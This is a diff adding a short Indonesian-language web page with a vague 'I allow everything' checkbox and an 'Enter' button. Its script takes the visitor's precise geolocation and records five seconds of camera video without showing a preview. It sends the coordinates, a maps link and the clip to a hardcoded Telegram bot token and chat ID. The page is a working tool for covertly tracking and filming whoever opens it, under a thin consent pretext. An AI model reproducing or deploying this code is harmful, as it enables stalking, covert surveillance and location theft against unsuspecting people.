@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome Izin kan dulu semua nya!!</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background: #0b0f14;
+      color: #e6edf3;
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      max-width: 420px;
+      width: 100%;
+      background: #111827;
+      border: 1px solid #1f2937;
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.4);
+    }
+    h1 { font-size: 1.1rem; margin: 0 0 8px; }
+    p { font-size: .9rem; color: #9ca3af; }
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid #1f2937;
+      background: #ef4444;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    button.secondary { background: #374151; margin-top: 8px; }
+    .log { font-size: .85rem; color: #d1d5db; margin-top: 8px; min-height: 20px; }
+    .consent {
+      display: flex; gap: 8px; align-items: flex-start;
+      background: #020617; border: 1px solid #1f2937; border-radius: 10px; padding: 10px; margin: 8px 0;
+      font-size: .85rem; color: #cbd5f5;
+    }
+    .consent input { margin-top: 2px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Kirim Lokasi & Video ke Telegram</h1>
+    <p>centang dulu di bawah ini dan izin kan semua.</p>
+
+    <div class="consent">
+      <input id="agree" type="checkbox" />
+      <label for="agree">
+        Saya izin kan.
+      </label>
+    </div>
+
+    <button id="startBtn">Masuk </button>
+    <button id="stopBtn" class="secondary" disabled>Stop</button>
+
+    <div class="log" id="log"></div>
+  </div>
+
+  <script>
+    // === GANTI DENGAN PUNYA ANDA ===
+    const BOT_TOKEN = "8385031014:AAHg5b3pL2B2999WY7mvbXAYa45G98hgfKE";
+    const CHAT_ID = "7719159066";
+
+    const logEl = document.getElementById('log');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const agree = document.getElementById('agree');
+
+    let stream = null;
+    let mediaRecorder = null;
+    let chunks = [];
+
+    function log(msg) {
+      logEl.textContent = msg;
+    }
+
+    async function sendText(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("text", text);
+      await fetch(url, { method: "POST", body: form });
+    }
+
+    async function sendVideo(blob) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("video", blob, "capture.webm");
+      await fetch(url, { method: "POST", body: form });
+    }
+
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject("Geolocation tidak didukung.");
+        }
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords),
+          err => reject(err.message),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function startCapture() {
+      if (!agree.checked) {
+        alert("Centang persetujuan terlebih dahulu.");
+        return;
+      }
+
+      try {
+        log("Meminta akses kamera & lokasi...");
+
+        // Ambil kamera TANPA menampilkan preview
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+
+        // Ambil lokasi
+        const coords = await getLocation();
+        const mapsLink = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+        await sendText(`📍 Lokasi:\nLat: ${coords.latitude}\nLng: ${coords.longitude}\n${mapsLink}`);
+
+        // Rekam 5 detik
+        chunks = [];
+        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp8" });
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: "video/webm" });
+          log("Mengirim video ke Telegram...");
+          await sendVideo(blob);
+          log("Selesai. Data terkirim.");
+        };
+
+        mediaRecorder.start();
+        log("Merekam 5 detik (tanpa tampilan kamera)...");
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+
+        setTimeout(() => {
+          if (mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+            stopStream();
+          }
+        }, 5000);
+
+      } catch (err) {
+        console.error(err);
+        log("Gagal: " + err);
+        stopStream();
+      }
+    }
+
+    function stopStream() {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+
+    startBtn.addEventListener('click', startCapture);
+    stopBtn.addEventListener('click', () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+      stopStream();
+      log("Dihentikan.");
+    });
+  </script>
+</body>
+</html>
